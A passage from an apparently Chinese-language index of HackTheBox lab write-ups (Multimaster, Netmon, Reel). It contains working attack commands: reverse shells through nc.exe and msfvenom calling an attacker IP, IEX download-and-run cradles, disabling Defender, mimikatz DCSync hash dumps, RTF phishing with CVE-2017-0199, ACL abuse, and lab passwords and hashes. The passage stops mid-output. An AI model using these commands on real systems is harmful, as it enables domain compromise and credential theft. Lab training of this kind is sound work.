0x0c24\n</code></pre> <ul> <li>\u4e00\u822c Administrator \u7684 RID \u4e3a <code>500 - 0x000001f4 - b'f4010000'</code>\uff0c \u5c1d\u8bd5\u83b7\u53d6 Administrator \u7528\u6237\u540d <code>aaa' union select 1,suser_sname(0x0105000000000005150000001c00d1bcd181f1492bdfc236f4010000),3,4,5-- -</code></li> </ul> <p></p> <ul> <li>\u679a\u4e3e rid\uff0c500 - 10000</li> </ul> <pre><code>from pwn import p32\nfor i in range(500, 10000):\n    print(p32(i).hex())\n</code></pre> <p></p> <pre><code>Administrator\nGuest\nkrbtgt\nDefaultAccount\nDomain Admins\nDomain Users\nDomain Guests\nDomain Computers\nDomain Controllers\nCert Publishers\nSchema Admins\nEnterprise Admins\nGroup Policy Creator Owners\nRead-only Domain Controllers\nCloneable Domain Controllers\nKey Admins\nEnterprise Key Admins\nRAS and IAS Servers\nDnsAdmins\nDnsUpdateProxy\nsvc-nas\nPrivileged IT Accounts\ntushikikatomo\n</code></pre> <ul> <li>\u4f7f\u7528 kerbrute \u53bb\u6389\u7528\u6237\u7ec4</li> </ul> <p></p> <p>\u53d1\u73b0\u4e86\u4e24\u4e2a\u65b0\u7528\u6237\uff0c\u518d\u6b21\u5c1d\u8bd5\u55b7\u5c04\u5bc6\u7801</p> <pre><code>crackmapexec smb $IP -u user.list -p pass.list --continue-on-success\n</code></pre> <p></p> <pre><code>export IP=10.10.10.179 DOMAIN=MEGACORP.LOCAL USER1=tushikikatomo PASS1=finance1\n</code></pre> <ul> <li>\u767b\u5f55\u6210\u529f</li> </ul> <p></p> <ul> <li>\u67e5\u8be2\u57df\u7528\u6237</li> </ul> <p></p> <pre><code>Administrator\nalyx\ncyork\nGuest\njorden\nkrbtgt\nokent\nsbauer\ntushikikatomo\naldom\nandrew\ndai\nilee\njsmmons\nlana\npmartin\nsvc-nas\nzac\nalice\nckane\nDefaultAccount\njames\nkpage\nnbourne\nrmartin\nsvc-sql\nzpowers\n</code></pre> <ul> <li>\u518d\u6b21\u55b7\u5c04\u5bc6\u7801\uff0c\u672a\u53d1\u73b0\u65b0\u7684\u51ed\u636e</li> </ul>"}, {"location": "HackTheBox/Machines/Multimaster/#bloodhound", "title": "Bloodhound", "text": "<pre><code>Invoke-WebRequest -Uri http://10.10.16.12/SharpHound.exe -O sharphound.exe\n./sharphound.exe -c all\n</code></pre>"}, {"location": "HackTheBox/Machines/Multimaster/#peas", "title": "PEAS", "text": "<pre><code>Invoke-WebRequest -Uri http://10.10.16.12/winPEASx64.exe -O winpeas.exe # \u6740\u8f6f\u4f1a\u6740\u6389\nIEX(New-Object Net.WebClient).DownloadString(\"http://10.10.16.12/winPEAS.ps1\")\n</code></pre> <p>\u6ca1\u5565\u53d1\u73b0</p>"}, {"location": "HackTheBox/Machines/Multimaster/#shell-as-user-cyork", "title": "Shell as User - cyork", "text": "<ul> <li>\u53d1\u73b0\u4e00\u4e9b\u4e3b\u673a\u7a0b\u5e8f</li> </ul> <p>https://github.com/taviso/cefdebug</p> <p>Visual Studio Code \u662f\u57fa\u4e8e Electron \u6784\u5efa\u7684\uff0c\u5982\u679c\u5f00\u542f\u4e86 debug \u6a21\u5f0f\uff0c\u5728\u67d0\u4e9b\u573a\u666f\u4e0b\uff0c\u8ba9\u53d7\u5bb3\u8005\u70b9\u51fb\u94fe\u63a5\uff0c\u5373\u53ef\u53cd\u5f39 Shell</p> <ul> <li>cefdebug.exe</li> </ul> <pre><code>Invoke-WebRequest -Uri http://10.10.16.12/cefdebug.exe -O cefdebug.exe\n./cefdebug.exe\n</code></pre> <p></p> <ul> <li>\u5411 ws \u53d1\u9001\u547d\u4ee4\u67e5\u770b\u662f\u5426\u80fd\u591f\u6267\u884c</li> </ul> <pre><code>./cefdebug.exe --url ws://127.0.0.1:47333/62f3e47e-aef0-4bec-904e-de5ea7763c39 --code \"process.mainModule.require('child_process').exec('whoami &gt; c:\\\\programdata\\\\whoami.txt')\"\ntype c:/programdata/whoami.txt\n</code></pre> <p></p> <ul> <li>\u53cd\u5f39 Shell</li> </ul> <pre><code>./cefdebug.exe  # \u4f7f\u7528 nc.exe \u53cd\u5f39\uff0c\u5176\u4ed6\u7684\u90fd\u5931\u8d25\u4e86\u3002\u800c\u4e14\u8981\u9009\u4e00\u4e2a\u5176\u4ed6\u7528\u6237\u53ef\u4ee5\u8bbf\u95ee\u7684\u76ee\u5f55\n./cefdebug.exe --url ws://127.0.0.1:59355/8529154c-317e-43fa-adf8-bb4226d6c617 --code \"process.mainModule.require('child_process').exec('\\\\\\\\10.10.16.12\\\\good\\\\nc.exe 10.10.16.12 2233 -e powershell')\"\n</code></pre> <p></p> <ul> <li>cyork \u5c5e\u4e8e\u5f00\u53d1\u8005\u7528\u6237\u7ec4\uff0c\u5c1d\u8bd5\u67e5\u627e\u654f\u611f\u6587\u4ef6</li> </ul> <p></p> <ul> <li>\u53d1\u73b0 wwwroot \u76ee\u5f55\u4e0b\u6709\u5f88\u591a dll \u6587\u4ef6\uff0c\u5f00\u53d1\u8005\u5f88\u6709\u53ef\u80fd\u5728\u6d4b\u8bd5\u671f\u95f4\u628a\u654f\u611f\u4fe1\u606f\u52a0\u5165\u8c03\u8bd5\uff0cMulti master API \u8fd9\u4e2a\u540d\u5b57\u6bd4\u8f83\u6709\u8da3</li> </ul> <p></p>"}, {"location": "HackTheBox/Machines/Multimaster/#shell-as-user-sbauer", "title": "Shell as User -sbauer", "text": "<ul> <li>windows \u591a\u4e3a 16-bit \u7f16\u7801\uff0c\u56e0\u6b64\u4f7f\u7528 strings \u67e5\u770b\u5b57\u7b26\u4e32\uff0c\u53d1\u73b0\u6570\u636e\u5e93\u7684\u51ed\u636e</li> </ul> <pre><code>strings -e {b,l} MultimasterAPI.dll\n---\n...\nHERE\nNFORMATION_SCHEMA\nASTER\n \"info\" : \"MegaCorp API\" }\npplication/json\nerver=localhost;database=Hub_DB;uid=finder;password=D3veL0pM3nT!;\nelect * from Colleagues where name like '%{0}%'\nosition\nmail\nmage\nVS_VERSION_INFO\n...\n</code></pre> <pre><code>finder:D3veL0pM3nT!\n</code></pre> <ul> <li>\u53e6\u5916\u901a\u8fc7 cyork \u67e5\u770b\u57df\u7528\u6237</li> </ul> <ul> <li>\u5168\u90e8\u6dfb\u52a0\u5230\u5b57\u5178\u4e2d\uff0c\u518d\u6b21\u5c1d\u8bd5\u5bc6\u7801\u55b7\u6d12\uff0c\u53d1\u73b0\u65b0\u7684\u7528\u6237\u51ed\u636e</li> </ul> <pre><code>export IP=10.10.10.179 DOMAIN=MEGACORP.LOCAL USER1=tushikikatomo PASS1=finance1 USER2=sbauer PASS2=D3veL0pM3nT!\n</code></pre> <ul> <li>\u767b\u5f55\u6210\u529f</li> </ul> <ul> <li>\u67e5\u770b\u6743\u9650\uff0c\u53d1\u73b0\u5bf9 jorden \u6709 GenericWrite \u6743\u9650\uff0c\u5373\u53ef\u4ee5\u66f4\u65b0 jorden \u7684\u5c5e\u6027</li> </ul> <ul> <li>\u4f7f jorden \u5f00\u542f \"\u4e0d\u9700\u8981\u9884\u8eab\u4efd\u9a8c\u8bc1\u9009\u9879\"\uff0c\u4ee5\u6b64\u6765\u8fdb\u884c Kerberoasting \u653b\u51fb</li> </ul> <pre><code>Get-ADUser Jorden | Set-ADAccountControl -doesnotrequirepreauth $true\n</code></pre>"}, {"location": "HackTheBox/Machines/Multimaster/#kerberoasting", "title": "Kerberoasting", "text": "<pre><code>impacket-GetNPUsers -dc-ip $IP -no-pass MEGACORP/jorden\n</code></pre>"}, {"location": "HackTheBox/Machines/Multimaster/#shell-as-user-jorden", "title": "Shell as User - jorden", "text": "<ul> <li>Hashcat</li> </ul> <pre><code>hashcat -m 18200 hash.list /usr/share/wordlists/rockyou.txt\n---\n$krb5asrep$23$jorden@MEGACORP:ce43857f47757defd140d7b62af56ff7$eec30c21fa6e6e88829aa1b9f145bc940fc3fbe7d68e8d53fe04bbfa6f212b8135becd6051616e42e6c73d9fb435207d28238ea96c9439c183cd84f40b8ae4c4d5c309f1fa7b07e187341cd6655a8814e730b687c482ddc6d1cc5c94acbdc676ae8a1b1373a58b6aac2f636bd05bd6492816f3482b3c803bbc9b2490a1cab893d12b261dcbc75262757c0fa02b240473b2336186acba925e2ec88de7878ce70cbab3bbbcb6976b7c8e9496a091d3c02cbc32d08a2053cb0dfe2913295a9e47308e9b5578632731fb91f5f5707497cf33eb6e146b522b143cddd86bb9a17b614b371f0f910e32cc2a1fb2:rainforest786\n</code></pre> <ul> <li>\u767b\u5f55\u6210\u529f</li> </ul> <pre><code>export IP=10.10.10.179 DOMAIN=MEGACORP.LOCAL USER1=tushikikatomo PASS1=finance1 USER2=sbauer PASS2=D3veL0pM3nT! USER3=jorden PASS3=rainforest786\n</code></pre> <p>\u53ef\u4ee5\u770b\u5230 jorden \u5177\u6709 SeBackupPrivilege \u6743\u9650\uff0c\u53ef\u4ee5\u4f7f\u7528\u5377\u5f71\u5907\u4efd\uff0c\u4f46\u662f\u66f4\u5feb\u7684\u65b9\u5f0f\u5e94\u8be5\u662f\u670d\u52a1\u52ab\u6301</p>"}, {"location": "HackTheBox/Machines/Multimaster/#shell-as-root", "title": "Shell as Root", "text": "<ul> <li>\u4f7f\u7528 reg \u67e5\u8be2\u670d\u52a1</li> </ul> <pre><code>reg query \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\"\n</code></pre> <p>\u627e\u5230\u4e00\u4e2a\u4e0d\u4f1a\u5f71\u54cd\u7cfb\u7edf\u7684\u670d\u52a1</p> <ul> <li>\u4fee\u6539\u670d\u52a1\u914d\u7f6e</li> </ul> <pre><code>sc.exe config browser binPath= \"C:\\Users\\jorden\\Documents\\nc.exe -e powershell 10.10.16.12 2233\"\nsc create browser binPath= \"C:\\Users\\jorden\\Documents\\nc.exe -e powershell 10.10.16.12 2233\"\nsc.exe stop browser\nsc.exe config SamSs binPath= \"C:\\Users\\jorden\\Documents\\nc.exe -e powershell 10.10.16.12 2233\"\nsc.exe start browser\n</code></pre> <p></p>"}, {"location": "HackTheBox/Machines/Multimaster/#dump-hash", "title": "Dump Hash", "text": "<pre><code>./mimikatz.exe \"lsadump::dcsync /domain:megacorp.local /all /csv\" exit\n---\n\n  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08\n .## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo)\n ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n ## \\ / ##       &gt; https://blog.gentilkiwi.com/mimikatz\n '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )\n  '#####'        &gt; https://pingcastle.com / https://mysmartlogon.com ***/\n\nmimikatz(commandline) # lsadump::dcsync /domain:megacorp.local /all /csv\n[DC] 'megacorp.local' will be the domain\n[DC] 'MULTIMASTER.MEGACORP.LOCAL' will be the DC server\n[DC] Exporting domain 'megacorp.local'\n[rpc] Service  : ldap\n[rpc] AuthnSvc : GSS_NEGOTIATE (9)\n502     krbtgt  06e3ae564999dbad74e576cdf0f717d3        514\n2101    dai     cb8a655c8bc531dd01a5359b40b20e7b        66048\n2102    svc-sql 3a36abdc15d86766d4cd243d8557e10d        66048\n1103    svc-nas fe90dcf97ce6511a65151881708d6027        66048\n1601    alice   19b44ab9ec562fe20b35ddb7c6fc0689        66048\n1112    lana    3c3c292710286a539bbec397d15b4680        66048\n1111    andrew  9e63ebcb217bf3c6b27056fdcb6150f7        66048\n3114    zpowers b7c7e43caa54942a2e85d9c8b4074f04        66048\n3104    ckane   b7c7e43caa54942a2e85d9c8b4074f04        66048\n3112    ilee    b7c7e43caa54942a2e85d9c8b4074f04        66048\n3103    okent   b7c7e43caa54942a2e85d9c8b4074f04        66048\n3113    nbourne b7c7e43caa54942a2e85d9c8b4074f04        66048\n3116    jsmmons b7c7e43caa54942a2e85d9c8b4074f04        66048\n3106    james   b7c7e43caa54942a2e85d9c8b4074f04        66048\n3109    zac     b7c7e43caa54942a2e85d9c8b4074f04        66048\n3108    rmartin b7c7e43caa54942a2e85d9c8b4074f04        66048\n3117    pmartin b7c7e43caa54942a2e85d9c8b4074f04        66048\n3105    kpage   b7c7e43caa54942a2e85d9c8b4074f04        66048\n3111    alyx    b7c7e43caa54942a2e85d9c8b4074f04        66048\n3115    aldom   b7c7e43caa54942a2e85d9c8b4074f04        66048\n500     Administrator   69cbf4a9b7415c9e1caf93d51d971be0        66048\n1000    MULTIMASTER$    8563c4d2e37052edb6edeb1332ac7a94        532480\n3107    cyork   06327297532725a64e1edec0aad81cfe        66048\n1110    tushikikatomo   1c9c8bfd28d000e8904f23c280b25d21        66048\n3102    sbauer  050ba67142895b5844a24d5ce9644702        66048\n3110    jorden  90960176fcbfe36b4a69fafb3cc0b716        4260352\n\nmimikatz(commandline) # exit\nBye!\n</code></pre>"}, {"location": "HackTheBox/Machines/Netmon/", "title": "Netmon", "text": ""}, {"location": "HackTheBox/Machines/Netmon/#recon", "title": "Recon", "text": "<p>export IP=10.10.10.152 - <code>nmap -sC -A -p- --min-rate 1000 -T4 10.10.11.234</code> <pre><code>PORT      STATE SERVICE      VERSION\n21/tcp    open  ftp          Microsoft ftpd\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n| 02-02-19  11:18PM                 1024 .rnd\n| 02-25-19  09:15PM       &lt;DIR&gt;          inetpub\n| 07-16-16  08:18AM       &lt;DIR&gt;          PerfLogs\n| 02-25-19  09:56PM       &lt;DIR&gt;          Program Files\n| 02-02-19  11:28PM       &lt;DIR&gt;          Program Files (x86)\n| 02-03-19  07:08AM       &lt;DIR&gt;          Users\n|_11-10-23  09:20AM       &lt;DIR&gt;          Windows\n| ftp-syst:\n|_  SYST: Windows_NT\n80/tcp    open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)\n|_http-server-header: PRTG/18.1.37.13946\n| http-title: Welcome | PRTG Network Monitor (NETMON)\n|_Requested resource was /index.htm\n|_http-trane-info: Problem with XML parsing of /evox/about\n135/tcp   open  msrpc        Microsoft Windows RPC\n139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn\n445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds\n5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\n49664/tcp open  msrpc        Microsoft Windows RPC\n49665/tcp open  msrpc        Microsoft Windows RPC\n49666/tcp open  msrpc        Microsoft Windows RPC\n49667/tcp open  msrpc        Microsoft Windows RPC\n49668/tcp open  msrpc        Microsoft Windows RPC\n49669/tcp open  msrpc        Microsoft Windows RPC\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Microsoft Windows Server 2016 build 10586 - 14393 (96%), Microsoft Windows Server 2016 (94%), Microsoft Windows 10 (93%), Microsoft Windows 10 1507 (93%), Microsoft Windows 10 1507 - 1607 (93%), Microsoft Windows Server 2012 (93%), Microsoft Windows Server 2012 R2 (93%), Microsoft Windows Server 2012 R2 Update 1 (93%), Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (93%), Microsoft Windows Vista SP1 - SP2, Windows Server 2008 SP2, or Windows 7 (93%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb-security-mode: \n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled but not required\n| smb2-time: \n|   date: 2024-01-09T03:28:19\n|_  start_date: 2024-01-09T03:24:35\n</code></pre></p>"}, {"location": "HackTheBox/Machines/Netmon/#shell-as-root", "title": "Shell as Root", "text": "<ul> <li>FTP \u533f\u540d\u767b\u9646\uff0c\u53ef\u4ee5\u904d\u5386\u7cfb\u7edf\u6587\u4ef6 </li> <li>\u53d1\u73b0\u5b89\u88c5\u4e86 PRTG Network Monitor \u8f6f\u4ef6\uff0c\u770b\u4e00\u4e0b\u5e94\u7528\u6570\u636e  </li> <li>\u767b\u5f55 <code>prtgadmin/PrTg@dmin2018</code>  \u63d0\u793a\u5bc6\u7801\u9519\u8bef\uff0c\u7531\u4e8e\u662f\u5907\u4efd\u7684\u5bc6\u7801\uff0c\u8003\u8651\u65f6\u95f4\u95ee\u9898\uff0c\u5c1d\u8bd5 <code>PrTg@dmin2019,PrTg@dmin2020</code> \u7b49\u7ec4\u5408</li> <li>\u6b63\u786e\u5bc6\u7801: <code>prtgadmin/PrTg@dmin2019</code>\uff0c\u7ad9\u70b9\u53ef\u4ee5\u8bbe\u7f6e\u4e2d\u6587 </li> <li>\u4e3b\u9875\u6709\u7248\u672c\uff0c\u4f18\u5148\u67e5\u627e CVE  </li> <li>\u8ba4\u8bc1 RCE\uff0c\u5c1d\u8bd5\u5229\u7528 </li> <li>evil-winrm \u8fde\u63a5\u5df2\u6dfb\u52a0\u7684\u65b0\u7528\u6237 <code>pentest/P3nT3st!</code> </li> </ul>"}, {"location": "HackTheBox/Machines/Netmon/#dump-hash", "title": "Dump Hash", "text": "<pre><code># \u5173\u95ed\u5b9e\u65f6\u9632\u62a4\n$preferences = Get-MpPreference\nSet-MpPreference -DisableRealtimeMonitoring (!$preferences.DisableRealtimeMonitoring) \n\npowershell (new-object System.Net.WebClient).DownloadFile('http://10.10.16.6/mimikatz.zip','C:\\Users\\pentest\\Documents\\mimikatz.zip')\nC:\\inetpub\\logs\\mimikatz.exe \"privilege::debug\" \"token::elevate\" \"lsadump::sam\" exit\n\n---\nAdministrator:d0f73603a4d96655430fdf02de4afaee\n</code></pre>"}, {"location": "HackTheBox/Machines/Reel/", "title": "Reel", "text": ""}, {"location": "HackTheBox/Machines/Reel/#recon-enum", "title": "Recon &amp; Enum", "text": "<p>export IP=10.10.10.77 - <code>nmap -sC -A -p- --min-rate 1000 -T4 10.10.11.252</code> <pre><code>PORT      STATE SERVICE      VERSION\n21/tcp    open  ftp          Microsoft ftpd\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n|_05-28-18  11:19PM       &lt;DIR&gt;          documents\n| ftp-syst: \n|_  SYST: Windows_NT\n22/tcp    open  ssh          OpenSSH 7.6 (protocol 2.0)\n| ssh-hostkey: \n|   2048 82:20:c3:bd:16:cb:a2:9c:88:87:1d:6c:15:59:ed:ed (RSA)\n|   256 23:2b:b8:0a:8c:1c:f4:4d:8d:7e:5e:64:58:80:33:45 (ECDSA)\n|_  256 ac:8b:de:25:1d:b7:d8:38:38:9b:9c:16:bf:f6:3f:ed (ED25519)\n25/tcp    open  smtp?\n| smtp-commands: REEL, SIZE 20480000, AUTH LOGIN PLAIN, HELP\n|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY\n| fingerprint-strings: \n|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, X11Probe: \n|     220 Mail Service ready\n|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest: \n|     220 Mail Service ready\n|     sequence of commands\n|     sequence of commands\n|   Hello: \n|     220 Mail Service ready\n|     EHLO Invalid domain address.\n|   Help: \n|     220 Mail Service ready\n|     DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY\n|   SIPOptions: \n|     220 Mail Service ready\n|     sequence of commands\n|     sequence of commands\n|     sequence of commands\n|     sequence of commands\n|     sequence of commands\n|     sequence of commands\n|     sequence of commands\n|     sequence of commands\n|     sequence of commands\n|     sequence of commands\n|     sequence of commands\n|   TerminalServerCookie: \n|     220 Mail Service ready\n|_    sequence of commands\n135/tcp   open  msrpc        Microsoft Windows RPC\n139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn\n445/tcp   open  microsoft-ds Windows Server 2012 R2 Standard 9600 microsoft-ds (workgroup: HTB)\n593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0\n49159/tcp open  msrpc        Microsoft Windows RPC\n...\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose|phone|specialized\nRunning (JUST GUESSING): Microsoft Windows 2012|8|Phone|7 (89%)\nOS CPE: cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_7\nAggressive OS guesses: Microsoft Windows Server 2012 or Windows Server 2012 R2 (89%), Microsoft Windows Server 2012 R2 (89%), Microsoft Windows Server 2012 (88%), Microsoft Windows 8.1 Update 1 (86%), Microsoft Windows Phone 7.5 or 8.0 (86%), Microsoft Windows Embedded Standard 7 (85%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: Host: REEL; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb-os-discovery: \n|   OS: Windows Server 2012 R2 Standard 9600 (Windows Server 2012 R2 Standard 6.3)\n|   OS CPE: cpe:/o:microsoft:windows_server_2012::-\n|   Computer name: REEL\n|   NetBIOS computer name: REEL\\x00\n|   Domain name: HTB.LOCAL\n|   Forest name: HTB.LOCAL\n|   FQDN: REEL.HTB.LOCAL\n|_  System time: 2024-01-15T09:28:22+00:00\n| smb-security-mode: \n|   account_used: &lt;blank&gt;\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: required\n| smb2-security-mode: \n|   3:0:2: \n|_    Message signing enabled and required\n| smb2-time: \n|   date: 2024-01-15T09:28:26\n|_  start_date: 2024-01-15T09:20:27\n</code></pre> - <code>crackmapexec smb $IP -u guest -p '' --shares</code> </p> <ul> <li> <p>ftp \u53d1\u73b0\u591a\u4e2a\u6587\u4ef6 </p> </li> <li> <p>\u67e5\u770b\u6587\u4ef6\uff0c\u53d1\u73b0\u4e00\u4e2a\u90ae\u7bb1\u5730\u5740\u548c\u4e00\u4e2a\u63d0\u793a</p> </li> </ul> <p></p> <p>\u76ee\u6807\u63a5\u6536\u90ae\u4ef6\u4f1a\u81ea\u52a8\u8f6c\u6362 <code>rft</code> \u6587\u4ef6\uff0c\u53d1\u73b0\u6f0f\u6d1e <code>CVE-2017-0199</code></p> <p></p>"}, {"location": "HackTheBox/Machines/Reel/#shell-as-user-nico", "title": "Shell as User - nico", "text": "<ul> <li>\u751f\u6210 Payload</li> </ul> <pre><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.18 LPORT=2233 -f hta-psh -o good.hta\npython2 41894.py -M gen -t RTF -w good.rtf -u \"http://10.10.16.18/good.hta\"\n</code></pre> <ul> <li>\u53d1\u9001\u90ae\u4ef6</li> </ul> <pre><code>sendemail -f good@megabank.com -t nico@megabank.com -u \"It's very good\" -m \"How are you, nico boy.\" -a good.rtf -s 10.10.10.77 -v\n</code></pre> <ul> <li>\u63a5\u6536 Reverse Shell</li> </ul>"}, {"location": "HackTheBox/Machines/Reel/#shell-as-user-tom", "title": "Shell as User - Tom", "text": "<ul> <li>\u5728\u684c\u9762\u4e0a\u53d1\u73b0 <code>cred.xml</code></li> </ul> <ul> <li>\u5c1d\u8bd5\u6062\u590d\u5bc6\u7801 <code>powershell -c \"$Cred = Import-Clixml -Path cred.xml; $Cred.GetNetworkCredential().Password\"</code></li> </ul> <ul> <li> <p>ssh \u767b\u5f55 <code>HTB\\Tom:1ts-mag1c!!!</code></p> </li> <li> <p>\u67e5\u770b smb \u5171\u4eab</p> </li> </ul> <p></p> <p>\u4f46\u662f\u6ca1\u6709\u53d1\u73b0\u6709\u7528\u7684\u4fe1\u606f</p> <ul> <li>\u8dd1\u4e00\u4e0b WinPEAS\uff0c\u905b\u4e00\u4e0b\u72d7</li> </ul> <pre><code>[kali] $ impacket-smbserver good .\n[tom] c:\\&gt; copy \\\\10.10.16.18\\good\\winPEASx64.exe winPEASx64.exe\n[tom] c:\\&gt; copy \\\\10.10.16.18\\good\\SharpHound.exe SharpHound.exe\n</code></pre> <ul> <li>\u7ec4\u7b56\u7565\u9650\u5236\uff0c\u65e0\u6cd5\u8fd0\u884c exe\uff0c\u5c1d\u8bd5\u8fdc\u7a0b\u52a0\u8f7d powershell</li> </ul> <p></p> <pre><code>powershell \"IEX(New-Object Net.WebClient).downloadString('http://10.10.16.18/winPEAS.ps1')\"\npowershell -c \"IEX(New-Object Net.Webclient).downloadstring('http://10.10.16.18/SharpHound.ps1');Invoke-BloodHound -CollectionMethod All\"\n</code></pre> <ul> <li>SharpHound.ps1 \u8fd0\u884c\u5931\u8d25</li> </ul> <p></p> <ul> <li>\u5728 winPEAS \u4e2d\u53d1\u73b0 nico \u7528\u6237\u7684\u51ed\u636e <code>HTB\\nico:4dri@na2017!**</code></li> </ul> <p></p> <ul> <li>\u5728 <code>C:\\Users\\tom\\Desktop\\</code> \u53d1\u73b0\u6709\u5b9e\u73b0\u8dd1\u8fc7\u7684 bloodhound \u8bb0\u5f55</li> </ul> <p></p> <p>\u63d0\u793a\u6ca1\u6709\u76f4\u63a5\u901a\u5f80\u57df\u63a7\u7684\u8def\u5f84\uff0c\u9700\u8981\u5148\u6a2a\u5411\u79fb\u52a8\uff0c\u53e6\u5916\u53d1\u73b0\u5173\u4e8e acl \u76f8\u5173\u7684\u6587\u4ef6</p> <ul> <li>\u672c\u5730\u6709\u4e00\u4e2a Powerview \u6587\u4ef6\uff0c\u53ef\u4ee5\u5229\u7528</li> </ul> <p></p>"}, {"location": "HackTheBox/Machines/Reel/#shell-as-user", "title": "Shell as User", "text": "<p>\u9996\u5148\u5206\u6790 acls.csv \u6587\u4ef6\uff0c\u8fd9\u662f\u4e00\u4e2a Bloodhound \u6536\u96c6\u7684\u4fe1\u606f\uff0c\u76ee\u524d\u7248\u672c\u7684 bloodhound \u4e0d\u517c\u5bb9\uff0c\u5bfc\u81f4\u5bfc\u5165\u5931\u8d25\uff0c\u56e0\u6b64\u624b\u52a8\u5206\u6790\u3002</p> <ul> <li>\u9996\u5148\u7b5b\u9009\u5df2\u6709\u7684\u7528\u6237</li> </ul> <p></p> <ul> <li>\u53d1\u73b0\u5bf9 <code>herman@HTB.LOCAL\u3001claire@HTB.LOCAL</code> \u7528\u6237\u5177\u6709 WriteOwner \u6743\u9650\uff0c\u53ef\u4ee5\u63a5\u7ba1\u8fd9\u4e24\u4e2a\u7528\u6237</li> </ul> <p></p> <ul> <li>\u7ee7\u7eed\u518d\u7b5b\u9009\u6dfb\u52a0\u8fd9\u4e24\u4e2a\u7528\u6237</li> </ul> <p></p> <p>\u5bf9 <code>Backup_Adminis</code> \u7ec4\u5177\u6709 WriteDacl \u6743\u9650\uff0c\u4f3c\u4e4e\u662f\u5907\u4efd\u7ba1\u7406\u5458\u7ec4\uff0c\u73b0\u5728\u5c1d\u8bd5\u5229\u7528</p>"}, {"location": "HackTheBox/Machines/Reel/#shell-as-user-claire", "title": "Shell as User - claire", "text": "<ol> <li>\u52a0\u8f7d PowerView</li> <li>\u8bbe\u7f6e tom \u4e3a claire ACL \u7684\u6240\u6709\u6743\u9650 </li> <li>\u83b7\u53d6 claire \u91cd\u7f6e\u5bc6\u7801\u7684\u6743\u9650 </li> </ol> <pre><code>Import-Module .\\PowerView.ps1\nSet-DomainObjectOwner -identity claire -OwnerIdentity tom -Verbose\nAdd-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword -Verbose\n</code></pre> <ul> <li>\u91cd\u7f6e claire \u7684\u5bc6\u7801</li> </ul> <pre><code>$NewPass = ConvertTo-SecureString 'Admin@123Admin@123' -AsPlainText -Force -Verbose\nSet-DomainUserPassword -Identity claire -AccountPassword $NewPass -Verbose\n</code></pre> <p>\u767b\u5f55 claire \u7528\u6237</p> <p></p> <ul> <li>\u67e5\u770b\u7528\u6237\u7ec4</li> </ul> <p></p> <p>\u7531\u4e8e claire \u7528\u6237\u5bf9 Backup_Admins \u7ec4\u6709 WriteDacl \u6743\u9650\uff0c\u56e0\u6b64\u53ef\u4ee5\u5c06\u81ea\u5df1\u6dfb\u52a0\u81f3\u8be5\u7528\u6237\u7ec4</p> <ul> <li>\u6dfb\u52a0 claire \u7528\u6237\u5230 Backup_Admins \u7ec4 <code>net group Backup_Admins claire /add /domain</code></li> </ul> <p></p>"}, {"location": "HackTheBox/Machines/Reel/#shell-as-root", "title": "Shell as Root", "text": "<ul> <li>\u6743\u9650\u548c\u7ec4\u540d\u4e0d\u592a\u5bf9\u5e94</li> </ul> <ul> <li>\u67e5\u770b\u4e00\u4e0b\u6587\u4ef6\u6743\u9650 <code>icacls c:\\users\\Administrator</code></li> </ul> <p>\u53ef\u4ee5\u8bbf\u95ee administrator \u76ee\u5f55</p> <ul> <li>\u65e0\u6cd5\u8bbf\u95ee root.txt \u4f46\u662f\u6709\u4e2a <code>Backup Scripts</code> \u76ee\u5f55</li> </ul> <p></p> <ul> <li>\u5728 BackupScript.ps1 \u4e2d\u53d1\u73b0\u7ba1\u7406\u5458\u5bc6\u7801</li> </ul> <p></p> <ul> <li>\u767b\u5f55 <code>Administrator:Cr4ckMeIfYouC4n!</code></li> </ul> <p></p>"}, {"location": "HackTheBox/Machines/Reel/#dump-hash", "title": "Dump Hash", "text": "<ul> <li><code>lsassy HTB.LOCAL -u Administrator -p 'Cr4ckMeIfYouC4n!' -dc-ip $IP</code></li> </ul> <pre><code>[+] HTB.LOCAL HTB\\tom                  